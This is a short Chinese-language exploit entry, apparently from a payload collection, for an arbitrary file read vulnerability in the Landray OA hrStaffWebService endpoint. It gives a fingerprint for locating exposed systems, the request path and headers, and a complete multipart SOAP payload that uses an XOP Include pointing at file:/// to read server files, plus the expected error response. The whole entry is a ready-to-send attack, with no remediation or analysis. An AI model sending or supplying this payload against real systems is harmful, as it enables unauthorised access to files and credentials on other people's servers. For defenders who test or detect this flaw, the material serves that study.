# 蓝凌OAhrstaffwebservice任意文件读取漏洞

- **系统**：蓝凌OAhrstaffwebservice　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="Landray-OA系统"`
- **请求**：`POST /sys/webservice/hrStaffWebService HTTP/1.1`
- **关键头**：`Content-Length: 565`　`Content-Type: multipart/related; boundary=----j0ofrwsv2dtllbzzkyh9`　`SOAPAction: ""`

**请求体 / payload**
```
------j0ofrwsv2dtllbzzkyh9
Content-Disposition: form-data; name="1"
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.staff.hr.kmss.landray.com/">
<soapenv:Header/>
<soapenv:Body>
<web:getHrStaffElements>
<arg0>
<beginTimeStamp>1</beginTimeStamp>
<count><xop:Include
xmlns:xop="http://www.w3.org/2004/08/xop/include"
href="file:///"/></count>
</arg0>
</web:getHrStaffElements>
</soapenv:Body>
</soapenv:Envelope>
------j0ofrwsv2dtllbzzkyh9--
```
- **预期**：500　|　Unmarshalling Error: Not a number: